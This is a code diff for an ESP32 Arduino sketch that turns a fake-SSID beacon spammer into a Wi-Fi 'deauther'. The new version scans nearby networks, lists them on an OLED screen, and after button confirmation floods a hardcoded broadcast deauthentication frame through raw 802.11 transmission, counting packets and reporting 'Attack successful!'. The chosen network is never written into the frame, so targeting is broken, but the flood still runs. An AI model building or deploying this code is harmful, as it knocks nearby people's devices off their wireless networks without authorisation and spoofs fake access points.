@@ -1,91 +1,276 @@
-#include <Arduino.h>
 #include <WiFi.h>
-#include <esp_wifi.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include "esp_wifi.h"
+#include <NimBLEDevice.h>
+#include "image_list.h"  // Ensure this header file contains the deauth image data
 
-int c = 16;
-int chr = 0;
-String tmp = "";
-String ph = " "; // Placeholder
-String text[17] = {"PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ","PEDE NO AIQ"};
-byte channel;
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
 
-// Beacon Packet buffer
-uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00,
-                        /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-                        /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                        /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-                        /*22*/  0xc0, 0x6c,
-                        /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
-                        /*32*/  0x64, 0x00,
-                        /*34*/  0x01, 0x04,
-                        /* SSID */
-                        /*36*/  0x00, 0x0F, // Update SSID length here (0x20 = 32 in decimal)
-                        0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
-                        0x01, 0x08, 0x82, 0x84,
-                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
-                        /*65*/  0x04
-                      };
+// GPIO pins
+#define SPEAKER_PIN 3
+#define BUTTON_RETURN 9
+#define BUTTON_ENTER 10
+#define BUTTON_DOWN 20
+#define BUTTON_UP 21
+#define OLED_SDA 6
+#define OLED_SCL 7
+
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+
+int selectedNetwork = 0;
+bool attackMode = false;
+uint8_t numNetworks = 0;
+String networks[20];  // Array to store detected networks
+
+const uint8_t deauth_packet[] = {
+  0xC0, 0x00, 0x3A, 0x01,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
+  0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED,
+  0x00, 0x00, 0xc0, 0x00, 0x3a, 0x01,
+  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xf0, 0xff, 0x02, 0x00
+};
+
+// BLE service and characteristics UUIDs
+#define SERVICE_UUID        "6E400001-B5A3-F393-E0A9-E50E24DCCA9E"
+#define CHARACTERISTIC_UUID "6E400002-B5A3-F393-E0A9-E50E24DCCA9E"
+
+NimBLEServer* pServer = nullptr;
+NimBLECharacteristic* pTxCharacteristic;
+bool deviceConnected = false;
+bool oldDeviceConnected = false;
+
+// Debounce timing
+unsigned long lastButtonPress = 0;
+const unsigned long debounceDelay = 300; // 300ms debounce delay
+
+// Function declarations
+void scanNetworks();
+void displayNetworks();
+void confirmAttack();
+void beginAttack();
+void displayAttackResults(bool success, int packetsSent, unsigned long duration); // Declare the function here
+
+bool isButtonPressed(int pin) {
+  if (digitalRead(pin) == LOW) {
+    if (millis() - lastButtonPress > debounceDelay) {
+      lastButtonPress = millis();
+      return true;
+    }
+  }
+  return false;
+}
 
 void setup() {
-  delay(500);
+  pinMode(BUTTON_RETURN, INPUT_PULLUP);
+  pinMode(BUTTON_ENTER, INPUT_PULLUP);
+  pinMode(BUTTON_DOWN, INPUT_PULLUP);
+  pinMode(BUTTON_UP, INPUT_PULLUP);
+
+  Serial.begin(115200);  // Initialize the serial for debugging
+
+  // Initialize the OLED display
+  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    while (true);  // Hang in error state
+  }
+
+  // Display the deauth image until "Enter" is pressed
+  display.clearDisplay();
+  display.drawBitmap(0, 0, deauthImage, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
+  display.display();
+
+  while (!isButtonPressed(BUTTON_ENTER)) {
+    delay(10);  // Wait until the Enter button is pressed
+  }
+
+  // Initialize Wi-Fi
   WiFi.mode(WIFI_STA);
-  esp_wifi_set_promiscuous(true);
-  Serial.begin(115200);
+  WiFi.disconnect(true);  // Disconnect from any previous connections
+  delay(100);
+
+  // Initialize BLE
+  NimBLEDevice::init("ESP32-C3-Deauther");
+  pServer = NimBLEDevice::createServer();
+  
+  NimBLEService *pService = pServer->createService(SERVICE_UUID);
+  pTxCharacteristic = pService->createCharacteristic(
+                      CHARACTERISTIC_UUID,
+                      NIMBLE_PROPERTY::NOTIFY
+                    );
+
+  pService->start();
+
+  NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
+  pAdvertising->addServiceUUID(SERVICE_UUID);
+  pAdvertising->start();
+
+  // Start scanning for networks
+  scanNetworks();
 }
 
 void loop() {
-  chr = 0;
-  if (c == 17) { // <- Change this for modified text[] size.
-    c = 0;
+  // Main loop doesn't need to do much, everything is handled in display or attack functions
+}
+
+void scanNetworks() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  display.println(F("Scanning..."));
+  display.display();
+
+  Serial.println("Starting Wi-Fi scan...");  // Debug output
+
+  // Start Wi-Fi scan with a timeout
+  int scanTimeout = 5000; // 5 seconds timeout
+  unsigned long startTime = millis();
+  numNetworks = WiFi.scanNetworks();
+
+  while (numNetworks == 0 && (millis() - startTime) < scanTimeout) {
+    delay(500); // Allow time for scanning
+    numNetworks = WiFi.scanNetworks();
   }
 
-  // Randomize channel
-  channel = random(1, 12);
-  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  if (numNetworks == 0) {
+    display.clearDisplay();
+    display.setCursor(0, 0);
+    display.println(F("No networks found."));
+    display.display();
+    delay(2000);
+    scanNetworks();  // Retry scanning
+  } else {
+    for (int i = 0; i < numNetworks; i++) {
+      networks[i] = WiFi.SSID(i);
+      if (deviceConnected) {
+        pTxCharacteristic->setValue(networks[i].c_str());
+        pTxCharacteristic->notify();
+      }
+    }
+    displayNetworks();  // Display the found networks
+  }
+}
 
-  // Randomize SRC MAC
-  packet[10] = packet[16] = random(256);
-  packet[11] = packet[17] = random(256);
-  packet[12] = packet[18] = random(256);
-  packet[13] = packet[19] = random(256);
-  packet[14] = packet[20] = random(256);
-  packet[15] = packet[21] = random(256);
+void displayNetworks() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
 
-  int pcount = 41; // Reset packet "pointer" to the first char of the SSID
-
-  // Fill the packets for SSID-Name with dots
-  for (int i = 40; i <= 52; i++) {
-    packet[i] = ph[0];
+  int start = max(0, selectedNetwork - 2);
+  for (int i = start; i < min(start + 5, (int)numNetworks); i++) {  // Cast numNetworks to int
+    if (i == selectedNetwork) {
+      display.setTextColor(BLACK, WHITE);  // Inverse color
+    } else {
+      display.setTextColor(WHITE);
+    }
+    display.setCursor(0, (i - start) * 10);
+    display.println(networks[i]);
   }
 
-  tmp = String(c + 10); // Convert int to string
+  display.display();
 
-  /*
-  // String operation to order the SSID List
-  packet[38] = ph[1]; // symbol: '
-  packet[39] = tmp[0];
-  packet[40] = tmp[1];
-  packet[41] = ph[3]; // symbol: -
-  */
-  // For every word
-  for (int i = 0; i < text[c].length(); i++) {
-    packet[pcount] = text[c][i];
-    pcount++;
+  // Navigate through the network list
+  while (true) {
+    if (isButtonPressed(BUTTON_DOWN)) {
+      selectedNetwork = (selectedNetwork + 1) % numNetworks;
+      displayNetworks();
+    } else if (isButtonPressed(BUTTON_UP)) {
+      selectedNetwork = (selectedNetwork - 1 + numNetworks) % numNetworks;
+      displayNetworks();
+    } else if (isButtonPressed(BUTTON_ENTER)) {
+      confirmAttack();
+      break;
+    }
+  }
+}
+
+void confirmAttack() {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  display.println(F("Press Enter to start attack"));
+  display.display();
+
+  // Wait for the user to confirm by pressing "Enter"
+  while (true) {
+    if (isButtonPressed(BUTTON_ENTER)) {
+      beginAttack();
+      break;
+    } else if (isButtonPressed(BUTTON_RETURN)) {
+      displayNetworks();  // Return to the network selection
+      break;
+    }
+  }
+}
+
+void beginAttack() {
+    unsigned long attackStartTime = millis();
+    int packetsSent = 0;
+    bool attackSuccess = true;
+
+    display.clearDisplay();
+    display.setTextSize(1);
+    display.setTextColor(WHITE);
+    display.setCursor(0, 0);
+    display.println(F("Attacking..."));
+    display.display();
+
+    if (deviceConnected) {
+        pTxCharacteristic->setValue("Deauth attack started...");
+        pTxCharacteristic->notify();
+    }
+
+    // Increase packet sending rate to make the attack more aggressive
+    while (digitalRead(BUTTON_RETURN) == HIGH) {
+        for (int i = 0; i < 50; i++) {  // Send 10 packets per loop iteration
+            if (!esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false)) {
+                attackSuccess = false;
+                break;  // Stop if there's an error sending packets
+            }
+            packetsSent++;
+        }
+
+        // Update the display with the current packet count
+        display.clearDisplay();
+        display.setTextSize(1);
+        display.setTextColor(WHITE);
+        display.setCursor(0, 0);
+        display.println(F("Attacking..."));
+        display.printf("Packets sent: %d\n", packetsSent);
+        display.display();
+
+        delay(10);  // Adjust delay if necessary
+    }
+
+    unsigned long attackEndTime = millis();
+    unsigned long attackDuration = (attackEndTime - attackStartTime) / 1000;  // Convert to seconds
+
+    displayAttackResults(attackSuccess, packetsSent, attackDuration);
+}
+
+
+
+void displayAttackResults(bool success, int packetsSent, unsigned long duration) {
+  display.clearDisplay();
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+
+  if (success) {
+    display.println(F("Attack successful!"));
+  } else {
+    display.println(F("Attack failed."));
   }
 
- // String operation to order the SSID List
-  packet[38] = tmp[0]; // symbol: '
-  packet[39] = tmp[1];
-  packet[40] = ph[0];
-  
+  display.printf("Packets sent: %d\n", packetsSent);
+  display.printf("Duration: %lus\n", duration);
+  display.display();
 
-
-
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
-  esp_wifi_80211_tx(WIFI_IF_STA, packet, 57, false);
-  c++; // Number printed before SSID name to display the right order
-
-  delay(1);
+  delay(5000);  // Display results for 5 seconds before returning
+  displayNetworks();
 }
